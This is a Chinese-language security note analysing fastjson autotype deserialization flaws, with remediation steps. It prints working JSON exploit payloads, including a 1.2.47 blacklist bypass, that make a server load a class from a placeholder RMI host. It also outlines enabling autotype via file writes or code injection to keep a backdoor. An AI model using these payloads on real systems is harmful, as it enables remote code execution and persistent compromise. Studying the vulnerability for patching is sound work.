# fast json漏洞

## enable_autotype

1. 设置autotype白名单
 1.1 代码中设置
``` java
ParserConfig.getGlobalInstance().addAccept("com.taobao.pac.client.sdk.dataobject."); 
```
 1.2 JVM启动参数中设置
``` sh
-Dfastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao. 
```
 1.3通过fastjson.properties文件配置
在1.2.25/1.2.26版本中支持通过类路径的fastkson.properties文件配置
``` properties
fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao. // 如果有多个包名前缀，用逗号隔开
```

2. 打开autotype功能

 2.1 JVM启动参数中打开
``` sh
-Dfastjson.parser.autoTypeSupport=true
```

 2.2 代码中设置
``` java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 
```

## fastjson反序列化漏洞

fastjson的"@type"用法(autotype)能够快速的将json语句转化为@type指定的实体类，但该方法存在代码执行漏洞，
攻击者可精心构造一个json序列化数据进行攻击，如：
``` json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://rmihost:port/Object","autoCommit":true}
```
当使用JSON.parseObject()解析以上json语句时，fastjson会初始化JdbcRowSetImpl，然后通过setDataSourceName()方法设置dataSourceName，
最后再通过setAutoCommit()方法设置autoCommit参数来达到从rmihost远程加载类达到攻击效果。

## fastjson <= 1.2.47远程代码执行漏洞分析
该漏洞严格来说属于逻辑漏洞，因为autotype存在安全漏洞，所以fastjson在1.2.25之后就修改了autotype功能，
使其不能反序列化任意类，而此次漏洞则是利用fastjson自身存在的漏洞来绕过了autotype的黑名单，实现了任意类的反序列。
利用该漏洞的POC如下：
``` json
{"cache":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"value":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://rmihost:port/Exploit","autoCommit":true}}
```
在1.2.48版本的补丁中，fastjson对黑名单做了更新，添加了java.lang.class这个类，在MiscCode中也将传入的cache参数设置为了false，ParserConfig.checkAutoType()也调整了检查策略和逻辑。

## 新版本fastjson反序列化漏洞利用

想要在新版本中利用fastjson的反序列化漏洞需要fastjson开启autotype功能，即项目满足enable_autotype中的相关设置。
也可通过其他的漏洞来实现fastjson的autotype功能开启，如：
1. 通过任意文件写漏洞，将fastjson开启autotype的JVM启动参数添加到启动文件中，如tomcat的catalina.sh文件
2. 利用java instrument进行代码注入开启fastjson的autotype功能，此用法可用于保存后门（待测试）

## 排查fastjson反序列化漏洞

1. 查看项目中正在使用fastjson版本，若存在受影响的fastjson版本，则立即进行升级,简易的查看方法(Linux环境下):
	``` sh
	find /target/path -type f -name 'fastjson-*.jar'
	```
2. 查看敏感文件是否被修改，如java程序的启动参数
3. 代码审查，查看代码中是否存在有手工设置开启fastjson autotype功能代码。

### 参考链接：
[FastJson最新反序列化漏洞分析][https://xz.aliyun.com/t/5680]
[FastJson 远程代码执行漏洞分析报告][https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955]
[Fastjson <=1.2.47 远程代码执行漏洞分析 ][https://www.anquanke.com/post/id/181874]
[fastjosn poc][https://github.com/shengqi158/fastjson-remote-code-execute-poc]